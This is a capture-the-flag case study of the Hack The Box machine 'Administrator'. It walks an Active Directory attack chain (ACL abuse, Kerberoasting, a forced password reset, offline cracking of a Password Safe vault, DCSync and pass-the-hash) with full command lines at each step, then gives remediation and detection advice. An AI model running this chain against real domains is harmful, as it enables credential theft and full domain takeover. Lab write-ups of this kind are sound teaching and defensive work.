---
title: "Administrator — ACL Abuse, Kerberoasting, and DCSync to Domain Compromise"
description: "Misconfigured object permissions drive a multi-hop chain through Kerberoasting, credential capture, and DCSync to domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberoasting
  - acl-abuse
  - dcsync
objective: "Move from a provided low-privileged domain credential to full domain compromise by chaining misconfigured object permissions without exploiting a software vulnerability."
tools:
  - nmap
  - rusthound-ce
  - bloodyAD
  - NetExec
  - hashcat
  - ftp
  - pwsafe2john
  - john
  - evil-winrm
  - impacket-secretsdump
skill: "Active Directory attack-path analysis and ACL-driven privilege escalation"
outcome: "Interactive WinRM session in the built-in Administrator context after DCSync replication and pass-the-hash"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain (Domain Controller); standard AD services alongside FTP (21) and WinRM (5985) |
| Starting position | Provided low-privileged domain-user credential |
| Objective | Progress from a provided domain credential to full domain compromise by following exposed object-permission paths |
| Outcome | WinRM session in the built-in Administrator context via DCSync replication and pass-the-hash |

## Misconfigured ACLs to Kerberoasting and DCSync

Administrator is a Medium-rated Hack The Box Active Directory lab whose compromise comes from misconfigured object-level permissions, with no software vulnerability involved. Starting from a provided low-privileged domain credential, directory collection exposes ACL edges that chain Kerberoasting, a forced password reset, an FTP-hosted Password Safe vault, a WinRM foothold, a second Kerberoasting hop, and finally DCSync replication with pass-the-hash to administrative control. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **BloodHound ACL mapping → SPN write and Kerberoasting → forced password reset → FTP-hosted Password Safe cracking → WinRM foothold → second Kerberoasting → DCSync replication → pass-the-hash Administrator**

## Directory target, provided credential, and escalation goal

- **Target:** a Windows Active Directory domain with a Domain Controller; standard AD services alongside FTP (21) and WinRM (5985).
- **Starting position:** a provided low-privileged domain-user credential; no prior domain access.
- **Objective:** progress from the starting account to full domain compromise by following the exposed object-permission paths.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: ACL mapping to DCSync and pass-the-hash

### 1. Service Enumeration

Observation: a script and version scan identifies the exposed services and the host's directory role.

Action: full default-script and version scan of the target.

```bash
nmap -sC -sV -oA <OUT_PREFIX> <TARGET_IP>
```

Significance: FTP and WinRM are the two non-standard surfaces. Every later pivot reuses legitimate AD or service functionality, so enumeration mainly has to establish where to authenticate.

Result: The source records a Windows Active Directory host exposing standard AD services alongside FTP (21) and WinRM (5985), and identifies the domain `<DOMAIN>` and the Domain Controller `<DC_HOST>`.

### 2. Directory Collection and Mapping ACL Paths

Observation: with a valid domain credential, a collector resolves who controls whom across directory objects.

Action: collect all domain objects and ACL edges with the starting credential.

```bash
rusthound-ce -d <DOMAIN> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  -o <OUT_DIR> -c All
```

Significance: `GenericAll` over a user object permits writing any attribute, including `servicePrincipalName`, which controls whether the account can be Kerberoasted, so a single ACL edge converts an ordinary user into a target.

Result: the collected graph shows a `GenericAll` edge from `<START_USER>` to a second account, `<SECOND_USER>`.

### 3. First Kerberoasting Hop: SPN Write and Offline Crack

Observation: `<SECOND_USER>` has no service principal name and is therefore not Kerberoastable, but the `GenericAll` edge permits adding one.

Action: write an SPN onto the account, request its service ticket, and crack the ticket offline.

```bash
bloodyAD -d <DOMAIN> --host <DC_HOST> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  set object '<SECOND_USER>' servicePrincipalName -v 'http/<SPN_VALUE>'

nxc ldap <DC_HOST> -d <DOMAIN> \
  -u '<START_USER>' -p '<START_PASSWORD>' \
  --kerberoasting <OUT_HASH_FILE>

hashcat -m 13100 <OUT_HASH_FILE> <WORDLIST>
```

Recovered value (redacted):

```text
<SECOND_PASSWORD>
```

Significance: Kerberoasting turns a weak service-account password into an offline-crackable ticket; the attribute write is the actual privilege abuse, and the remainder is documented protocol behavior.

Result: `<SECOND_USER>`'s password is recovered and used as the credential for the forced password reset in the next stage.

### 4. Lateral Movement: Forced Password Reset

Observation: `<SECOND_USER>` holds `ForceChangePassword` over a third account, `<THIRD_USER>`.

Action: reset the third account's password to an operator-chosen value.

```bash
bloodyAD -d <DOMAIN> \
  -u '<SECOND_USER>' -p '<SECOND_PASSWORD>' \
  --host <DC_HOST> \
  set password <THIRD_USER> '<NEW_PASSWORD>'
```

Significance: the reset right is equivalent to account takeover and needs no ticket or hash handling, so a single ACL edge converts the recovered service credential into control of another account.

Result: the documented reset succeeds, bringing `<THIRD_USER>` under the operator-chosen password.

### 5. Vault Recovery: FTP-Hosted Password Safe

Observation: `<THIRD_USER>` can authenticate to the FTP service, which hosts a Password Safe database (`.psafe3`).

Action: download the vault, extract its hash, and crack the master password offline.

```bash
ftp <TARGET_IP>
# login:    <THIRD_USER>
# password: <NEW_PASSWORD>
ftp> get <VAULT_FILE>

pwsafe2john <VAULT_FILE> > <OUT_HASH_FILE>
john <OUT_HASH_FILE> --wordlist=<WORDLIST>
```

Recovered master password (redacted):

```text
<VAULT_MASTER_PASSWORD>
```

Vault contents, three credential pairs (values redacted):

```text
<SERVICE_USER_A>  <SERVICE_PASSWORD_A>
<SERVICE_USER_B>  <SERVICE_PASSWORD_B>
<SERVICE_USER_C>  <SERVICE_PASSWORD_C>
```

Significance: a single cracked master password exposes the internal credential inventory, so storing the vault on an FTP share reduces its protection to FTP access control plus master-password strength.

Result: three service credential pairs are recovered from the vault.

### 6. Foothold: WinRM Login

Observation: one recovered vault credential belongs to an account permitted to authenticate over WinRM.

Action: I tried the recovered vault credential over WinRM.

```bash
evil-winrm -i <DOMAIN> \
  -u '<SERVICE_USER_A>' -p '<SERVICE_PASSWORD_A>'
```

Significance: the FTP-hosted vault credential also authenticates over WinRM, so the same secret is reused from a file share for remote management; WinRM also provides a scriptable interactive shell.

Result: an interactive session as the service account establishes the foothold.

### 7. Second Kerberoasting Hop and Escalation Within the Domain

Observation: continued collection shows `<SERVICE_USER_A>` holds `GenericWrite` over a further account, `<PRIV_USER>`, enough to write its SPN.

Action: repeat the SPN-write, Kerberoast, and crack sequence under the new identity.

```bash
bloodyAD -d <DOMAIN> \
  -u '<SERVICE_USER_A>' -p '<SERVICE_PASSWORD_A>' \
  --host <DC_HOST> \
  set object '<PRIV_USER>' servicePrincipalName -v 'http/<SPN_VALUE>'

nxc ldap <DC_HOST> -d <DOMAIN> \
  -u '<SERVICE_USER_A>' -p '<SERVICE_PASSWORD_A>' \
  --kerberoasting <OUT_HASH_FILE>

hashcat -m 13100 <OUT_HASH_FILE> <WORDLIST>
```

Recovered value (redacted):

```text
<PRIV_PASSWORD>
```

Significance: the same ACL abuse pattern recurs one level higher, so the misconfiguration is systemic.

Result: `<PRIV_USER>`'s password is recovered and subsequently validated by the replication operation in the next stage.

### 8. Domain Compromise: DCSync and Pass-the-Hash

Observation: `<PRIV_USER>` holds `DS-Replication-Get-Changes-All`, the replication right that constitutes DCSync.

Action: replicate the domain's credential material, then authenticate as the built-in Administrator using the replicated hash instead of a password.

```bash
impacket-secretsdump '<DOMAIN>/<PRIV_USER>:<PRIV_PASSWORD>@<DC_HOST>'
```

Replicated credential record (structure only, values redacted):

```text
<ADMIN_ACCOUNT>:500:<LM_HASH_REDACTED>:<NT_HASH_REDACTED>:::
```

```bash
evil-winrm -i <DOMAIN> \
  -u <ADMIN_ACCOUNT> \
  -H '<NT_HASH_REDACTED>'
```

Significance: DCSync is a protocol-legitimate replication call, so against a non-controller principal it is a critical misconfiguration; pass-the-hash then converts the replicated hash directly into an interactive session without cracking.

Result: a WinRM session in the built-in Administrator context is established.

## Challenges and Decisions

The source records no failed attempts, wrong turns, or explicit tradeoffs. The path follows the ACL edges exposed by directory collection, and each hop uses documented, legitimate AD functionality.

## Outcome: DCSync replication and domain administrative access

The evidence establishes administrative control of the domain through misconfigured object permissions alone, with no software vulnerability exploited at any hop. Limitations: credential values and the replicated NTLM hash are redacted, so the recovered secrets are not reproducible from this writeup, and the WinRM shell transcript itself is not captured; the foothold and the escalation rest on the recorded command output and the authenticated operations that follow.

## Recommendations: ACLs, replication rights, the vault, and weak service passwords

The actions below remain recommendations; validation and re-testing were not performed for this case study.

1. **Over-provisioned directory ACLs.** `GenericAll` and `GenericWrite` on user objects let one account add service principal names and roast another account's password, and `ForceChangePassword` enabled a direct takeover. *Recommendation:* audit object-level permissions regularly with a BloodHound-style collector and remove non-standard delegation paths, especially those reaching high-value targets. *Detection:* monitor directory attribute writes to `servicePrincipalName` and on out-of-band password resets.
2. **Replication rights on a non-controller principal.** A user-class object held `DS-Replication-Get-Changes-All`, which allowed the entire domain credential set to be replicated. *Recommendation:* restrict DCSync rights to Domain Controllers and explicitly designated replication principals. *Detection:* monitor directory replication requests originating from accounts other than controllers.
3. **Credential vault on a file share.** A Password Safe database stored on FTP exposed three service credentials once its master password was cracked offline. *Recommendation:* keep credential vaults off FTP and general shares, on dedicated secrets-management infrastructure with MFA and access logging. *Validation:* inventory file shares for vault-format files and confirm none are reachable without strong, monitored authentication.
4. **Weak Kerberoastable service passwords.** Two accounts had passwords that fell to offline dictionary cracking of their service tickets, extending the blast radius to everything their ACLs touched. *Recommendation:* enforce long, random passwords for accounts with service principal names and rotate any that have ever been Kerberoastable.
5. **Limited visibility into privilege-abuse primitives.** The pivots relied on SPN modification and forced password resets, both of which appear in directory audit data. *Recommendation:* enable and review directory audit logging for attribute writes, ACL changes, and account-reset events, and treat unexpected occurrences as findings to investigate.

## References

- [Hack The Box — Administrator](https://app.hackthebox.com/machines/Administrator) (retired machine)
- [MS-ADTS Control Access Rights — DS-Replication-Get-Changes-All (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb) (Windows protocol specification for the replication control access right)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (BloodHound-compatible Active Directory collector)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Active Directory privilege and attribute operations)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (LDAP and Kerberos operations, including Kerberoasting)
- [hashcat](https://hashcat.net/hashcat/) (offline Kerberos ticket cracking)
- [John the Ripper](https://www.openwall.com/john/) (Password Safe hash cracking)
- [Password Safe](https://pwsafe.org/) (credential vault format)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell)
- [Impacket](https://github.com/fortra/impacket) (`secretsdump` replication and pass-the-hash)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
